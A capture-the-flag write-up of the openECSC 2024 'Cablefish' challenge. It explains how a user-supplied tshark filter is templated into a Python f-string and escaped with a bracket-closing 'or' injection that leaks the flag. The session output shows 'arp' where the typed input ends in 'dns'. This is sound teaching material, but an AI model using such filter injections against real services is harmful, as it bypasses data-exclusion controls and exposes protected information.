# Cablefish

## Description

```
Welcome to our platform! Here you can do traffic analysis via TCP, isn't it awesome?

Just specify your filter, we will sanitize it (we want to make sure no sensitive data will be leaked) and you will be given the traffic!

This is a remote challenge, you can connect with:

nc cablefish.challs.open.ecsc2024.it 38005
```

## Provided Files

- `chall.py`

## Solve Process

When looking at the source code provided, we can observe that this service provides a method to set a `tshark` filter to observe a saved `.pcap` file on the server.

The interesting bit is how the filter is piped into the command string

```py
# --- snip ---

flag = os.getenv('FLAG', 'openECSC{redacted}')

# --- snip ---

filter = filter[:50]
sanitized_filter = f'(({filter}) and (not frame contains "flag_placeholder"))'
p1 = subprocess.Popen(['tshark', '-r', '/home/user/capture.pcapng', '-Y', sanitized_filter, '-T', 'fields', '-e', 'tcp.payload'], shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
stdout, stderr = p1.communicate()
```

So `filter` is basically the raw data that we can pass via `netcat` and it firstly gets split down to a limit of 50 characters and then templated into an `f-string`.

No other sanitization takes place, which is cool since this means we can escap the brackets pretty easily, when just looking at the hardcoded stuff.

```py
f'(({filter}) and (not frame contains "flag_placeholder"))'
```

Since `flag_placeholder` will be substituted with our actual flag, we want to not have it excluded, which the hardcoded string does.
By utilizing some bracket trickery and additional logic operators, we can escape from the bracket confinement.

```t
# define this as our input
input = 'frame contains "flag_placeholder" )) or (( dns'
# which would yield
'(( frame contains "flag_placeholder" )) or (( dns ) and (not frame contains "flag_placeholder"))'
```

This makes the entire hardcoded expression optional since we utilize `or`.

Let's input this to the `netcat` accessible service and check if were correct.

```bash
~ ❯ ncat cablefish.challs.open.ecsc2024.it 38005

# --- snip ---

Please, specify your filter: frame contains "flag_placeholder" )) or (( dns
Loading, please wait...
Evaluating the filter: ((frame contains "flag_placeholder" )) or ((arp) and (not frame contains "flag_placeholder"))

openECSC{5c9dc5b7-2690-428a-9dcf-0aed3a1b3893}.

# --- snip ---
```

And that is a solve.
